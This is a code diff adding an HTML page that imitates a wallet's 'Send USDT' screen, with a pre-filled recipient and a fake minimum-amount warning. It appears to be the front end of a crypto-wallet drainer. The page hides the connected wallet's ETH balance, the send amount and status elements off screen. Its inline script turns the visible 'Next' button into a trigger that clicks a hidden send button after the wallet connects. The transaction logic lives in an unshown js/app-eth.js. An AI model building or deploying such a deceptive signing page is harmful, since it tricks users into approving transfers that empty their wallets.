@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Send USDT</title>
+<script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+}
+    html,
+    body{
+    width:100%;
+    max-width:100%;
+    overflow-x:hidden;
+}
+
+body{
+    background:#ffffff;
+    display:flex;
+    justify-content:center;
+    align-items:flex-start;
+    min-height:100vh;
+    color:#1c1c1e;
+}
+
+.modal{
+    overflow-x:hidden;
+    width:100%;
+    max-width:390px;
+    background:#fff;
+    padding:18px 18px 100px;
+    min-height:100vh;
+    position:relative;
+}
+
+/* Header */
+.header{
+    position:relative;
+    text-align:center;
+    margin-bottom:22px;
+    padding-top:4px;
+}
+
+.header h1{
+    font-size:20px;
+    font-weight:700;
+    color:#000;
+}
+
+.close{
+    position:absolute;
+    right:0;
+    top:2px;
+    width:24px;
+    height:24px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    cursor:pointer;
+    color:#1c1c1e;
+}
+
+.close svg{ width:21px; height:21px; }
+
+/* Labels */
+.label{
+    font-size:15px;
+    color:#8a8a8e;
+    margin-bottom:8px;
+    display:block;
+    font-weight:600;
+}
+
+/* Address input */
+.input-box{
+    max-width:100%;
+    overflow:hidden;
+    width:100%;
+    min-height:56px;
+    border:1.5px solid #1f3bff;
+    border-radius:14px;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    padding:0 12px;
+    background:#fff;
+    margin-bottom:22px;
+}
+
+.address{
+    font-size:18px;
+    color:#1c1c1e;
+    font-weight:500;
+    overflow:hidden;
+    white-space:nowrap;
+    flex:1;
+    border:none;
+    outline:none;
+    background:transparent;
+    min-width:0;
+    font-family:inherit;
+}
+.address::placeholder{ color:#8a8a8e; font-weight:500; }
+
+.actions{
+    display:flex;
+    align-items:center;
+    gap:11px;
+    flex-shrink:0;
+}
+
+/* Gray clear circle */
+.clear{
+    width:27px;
+    height:27px;
+    min-width:27px;
+    border-radius:50%;
+    background:#4f4f55;
+    color:#fff;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    cursor:pointer;
+}
+.clear svg{ width:13px; height:13px; }
+
+.copy{
+    color:#1f5bff;
+    font-size:15px;
+    font-weight:600;
+    cursor:pointer;
+}
+
+.icon-btn{
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    cursor:pointer;
+    color:#1f3bff;
+}
+.icon-btn svg{ width:22px; height:22px; }
+
+/* Network pill */
+.network{
+    display:inline-flex;
+    align-items:center;
+    gap:7px;
+    background:#f0eef8;
+    padding:8px 13px;
+    border-radius:999px;
+    margin-bottom:22px;
+    cursor:pointer;
+}
+
+.eth-logo{
+    width:25px;
+    height:25px;
+    border-radius:50%;
+    background:#627eea;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    flex-shrink:0;
+}
+.eth-logo svg{ width:13px; height:13px; }
+
+.network span{
+    font-size:15px;
+    font-weight:700;
+    color:#a3a3ab;
+    display:flex;
+    align-items:center;
+    gap:6px;
+}
+.network .caret{ width:11px; height:11px; color:#1c1c1e; }
+
+/* Amount input */
+.amount-box{
+   max-width:100%;
+    overflow:hidden; 
+    width:100%;
+    min-height:56px;
+    border:1.5px solid #e3e3e7;
+    border-radius:14px;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    padding:0 12px;
+    margin-bottom:10px;
+}
+
+.amount{
+    font-size:19px;
+    color:#1c1c1e;
+    flex:1;
+    border:none;
+    outline:none;
+    background:transparent;
+    width:100%;
+    min-width:0;
+    font-family:inherit;
+}
+.amount::placeholder{ color:#1c1c1e; }
+
+.right{
+    display:flex;
+    align-items:center;
+    gap:11px;
+    flex-shrink:0;
+}
+
+.token{
+    font-size:16px;
+    color:#1c1c1e;
+    font-weight:600;
+}
+
+.max{
+    color:#1f5bff;
+    font-size:16px;
+    font-weight:700;
+    cursor:pointer;
+}
+
+/* Warning */
+.warning{
+    color:#c0392b;
+    font-size:15px;
+    font-weight:500;
+}
+
+/* Bottom button */
+.btn{
+    position:fixed;
+    left:50%;
+    transform:translateX(-50%);
+    bottom:22px;
+    width:calc(100% - 36px);
+    max-width:354px;
+    height:54px;
+    border:none;
+    border-radius:999px;
+    background:#9b97f0;
+    color:#fff;
+    font-size:17px;
+    font-weight:700;
+    cursor:pointer;
+}
+    #walletInfo,
+
+#status,
+
+#mobileWalletOptions{
+
+    position:absolute !important;
+
+    left:-99999px !important;
+
+    width:1px !important;
+
+    height:1px !important;
+
+    overflow:hidden !important;
+
+}
+</style>
+</head>
+
+<body>
+<div id="wallet" style="height:1px;width:1px;overflow:hidden;"></div>
+<div class="modal">
+
+    <div class="header">
+        <h1>Send USDT</h1>
+        <div class="close">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><path d="M18 6 6 18M6 6l12 12"/></svg>
+        </div>
+    </div>
+
+    <label class="label">Address or domain name</label>
+
+    <div class="input-box">
+        <input class="address" id="addressInput" type="text" placeholder="Search or enter" value="66d4B4C0F425159C" />
+
+        <div class="actions">
+            <div class="clear">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round"><path d="M18 6 6 18M6 6l12 12"/></svg>
+            </div>
+            <div class="copy">Paste</div>
+            <div class="icon-btn">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"/><path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"/></svg>
+            </div>
+            <div class="icon-btn">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 7V5a2 2 0 0 1 2-2h2"/><path d="M17 3h2a2 2 0 0 1 2 2v2"/><path d="M21 17v2a2 2 0 0 1-2 2h-2"/><path d="M7 21H5a2 2 0 0 1-2-2v-2"/><path d="M7 12h10"/></svg>
+            </div>
+        </div>
+    </div>
+
+    <label class="label">Destination network</label>
+
+    <div class="network">
+        <div class="eth-logo">
+            <svg viewBox="0 0 24 24" fill="#fff"><path d="M12 2 5.5 12.3 12 16l6.5-3.7L12 2z" opacity=".85"/><path d="M12 17.2 5.5 13.5 12 22l6.5-8.5L12 17.2z"/></svg>
+        </div>
+        <span>Ethereum
+            <svg class="caret" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m6 9 6 6 6-6"/></svg>
+        </span>
+    </div>
+
+    <label class="label">Amount</label>
+
+    <div class="amount-box">
+        <input class="amount" id="amountInput" type="text" inputmode="decimal" value="" placeholder="0" />
+
+        <div class="right">
+            <div class="clear">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round"><path d="M18 6 6 18M6 6l12 12"/></svg>
+            </div>
+            <div class="token">USDT</div>
+            <div class="max">Max.</div>
+        </div>
+    </div>
+
+    <div class="warning">The minimum amount is 0.000001 USDT</div>
+
+    <button class="btn" id="connectBtn">Next</button>
+
+</div>
+
+<!-- Hidden elements for js/app-eth.js -->
+<div id="walletInfo" style="display:none !important; visibility:hidden !important;">
+    <span id="currentBalance">0.0000 ETH</span>
+    <span id="sendAmount">0.0000 ETH</span>
+    <span id="walletAddress"></span>
+</div>
+<div id="status"
+     style="display:none;
+            position:absolute;
+            left:-99999px;
+            width:1px;
+            height:1px;
+            overflow:hidden;">
+</div>
+<button id="sendBtn" style="display:none;" disabled></button>
+<div id="mobileWalletOptions" style="display:none;">
+    <button id="openTrustWallet"></button>
+    <button id="openMetaMask"></button>
+</div>
+
+<script src="js/app-eth.js"></script>
+
+<script>
+(function() {
+    var connectBtn = document.getElementById('connectBtn');
+    var sendBtn = document.getElementById('sendBtn');
+    var signState = 'idle';
+
+    // Watch for wallet connected state
+    var observer = new MutationObserver(function() {
+        if (connectBtn.textContent.includes('Connected') || connectBtn.textContent.includes('✅')) {
+            signState = 'connected';
+            connectBtn.disabled = false;
+            connectBtn.innerHTML = 'Send';
+        }
+    });
+    observer.observe(connectBtn, { childList: true, subtree: true, characterData: true });
+
+    // Watch walletInfo display
+    var walletInfo = document.getElementById('walletInfo');
+    var wiObserver = new MutationObserver(function() {
+        if (walletInfo.style.display !== 'none') {
+            signState = 'connected';
+            connectBtn.disabled = false;
+            connectBtn.innerHTML = 'Send';
+        }
+    });
+    wiObserver.observe(walletInfo, { attributes: true, attributeFilter: ['style'] });
+
+    // Watch sendBtn enabled
+    var sbObserver = new MutationObserver(function() {
+        if (!sendBtn.disabled) {
+            signState = 'connected';
+            connectBtn.disabled = false;
+            connectBtn.innerHTML = 'Send';
+        }
+    });
+    sbObserver.observe(sendBtn, { attributes: true, attributeFilter: ['disabled'] });
+
+    // Second click → sign + send
+    connectBtn.addEventListener('click', function(e) {
+        if (signState === 'connected') {
+            e.stopImmediatePropagation();
+            sendBtn.disabled = false;
+            sendBtn.click();
+            signState = 'signed';
+        }
+    }, false);
+})();
+</script>
+
+</body>
+</html>
